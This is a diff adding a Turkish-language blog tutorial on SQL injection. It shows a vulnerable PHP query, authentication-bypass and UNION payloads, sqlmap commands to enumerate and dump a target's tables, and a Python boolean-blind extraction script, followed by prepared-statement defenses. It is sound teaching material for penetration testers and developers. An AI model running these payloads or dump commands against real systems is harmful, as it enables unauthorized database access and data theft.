@@ -1,0 +1,119 @@
+---
+title: "SQL Injection: Temelden İleriye"
+date: "2026-03-15"
+description: "SQL injection saldırısının nasıl çalıştığını, tespit yöntemlerini ve savunma tekniklerini pratik örneklerle ele aldım."
+tags: ["Web Güvenliği", "Pentest"]
+---
+
+## SQL Injection Nedir?
+
+SQL Injection (SQLi), kullanıcıdan alınan girdinin doğrudan SQL sorgusuna dahil edilmesiyle oluşan bir güvenlik açığıdır. Doğru şekilde sömürüldüğünde veritabanını okumak, değiştirmek hatta sistem komutları çalıştırmak mümkün olabilir.
+
+> OWASP Top 10'da yıllarca birinci sırada yer almıştır. Hâlâ en yaygın ve tehlikeli açıklardan biri.
+
+## Zafiyetin Kökü
+
+Aşağıdaki PHP koduna bakın:
+
+```php
+// ❌ Tehlikeli — doğrudan birleştirme
+$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
+```
+
+Kullanıcı `' OR '1'='1` girerse sorgu şu hale gelir:
+
+```sql
+SELECT * FROM users WHERE username = '' OR '1'='1'
+```
+
+Bu sorgu tüm kullanıcıları döndürür.
+
+## Temel Payload'lar
+
+```sql
+-- Authentication bypass
+' OR 1=1 --
+' OR 'a'='a
+admin'--
+
+-- Hata bazlı tespit
+'
+''
+`
+')
+"))
+
+-- UNION tabanlı veri çekme
+' UNION SELECT null, username, password FROM users --
+```
+
+## Otomatik Tespit: sqlmap
+
+```bash
+# Temel tarama
+sqlmap -u "http://target.com/page?id=1"
+
+# Veritabanı listele
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Tablo ve kolon dök
+sqlmap -u "http://target.com/page?id=1" -D hedef_db --tables
+sqlmap -u "http://target.com/page?id=1" -D hedef_db -T users --dump
+
+# Cookie ile oturum gönder
+sqlmap -u "http://target.com/profile" \
+  --cookie="session=abc123" \
+  --level=3 --risk=2
+```
+
+## Blind SQLi — Boolean Tabanlı
+
+Hata mesajı yoksa farklı bir yaklaşım gerekir:
+
+```python
+import requests
+
+url = "http://target.com/page?id=1"
+charset = "abcdefghijklmnopqrstuvwxyz0123456789"
+result = ""
+
+for i in range(1, 20):
+    for char in charset:
+        payload = f"1 AND SUBSTRING((SELECT database()),{i},1)='{char}'"
+        r = requests.get(url, params={"id": payload})
+        if "Welcome" in r.text:  # true condition
+            result += char
+            break
+
+print(f"[+] Veritabanı adı: {result}")
+```
+
+## Savunma: Prepared Statements
+
+```python
+# ✅ Güvenli — parametre bağlama
+import sqlite3
+
+conn = sqlite3.connect("app.db")
+cursor = conn.cursor()
+
+username = input("Kullanıcı adı: ")
+cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+user = cursor.fetchone()
+```
+
+```php
+// ✅ PHP PDO ile
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$_GET['user']]);
+$user = $stmt->fetch();
+```
+
+## Özet
+
+- Kullanıcı girdisini **asla** doğrudan sorguya dahil etme
+- **Prepared statement** veya **ORM** kullan
+- WAF tek başına yeterli değil — kod seviyesinde önlem şart
+- Pentest sırasında önce manuel, sonra sqlmap ile doğrula
+
+Bir sonraki yazıda **blind SQLi** tekniklerini ve **out-of-band** saldırıları ele alacağım.
